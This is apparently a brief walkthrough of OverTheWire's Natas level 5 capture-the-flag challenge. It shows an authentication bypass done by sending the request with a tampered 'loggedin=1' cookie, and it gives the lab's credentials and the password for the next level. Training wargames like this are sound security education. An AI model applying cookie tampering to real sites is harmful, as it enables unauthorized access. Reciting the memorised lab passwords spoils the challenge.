Page shows the following message:
```
Access disallowed. You are not logged in
```

Also the HTTP response sets a cookie:
```
Set-Cookie: loggedin=0
```

All you need to do is request the page with the loggedin cookie set to 1:
```
http -a natas5:Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD http://natas5.natas.labs.overthewire.org/ Cookie:loggedin=1
```

Password for the next level is `0RoJwHdSKWFTYR5WuiAewauSuNaBXned`.
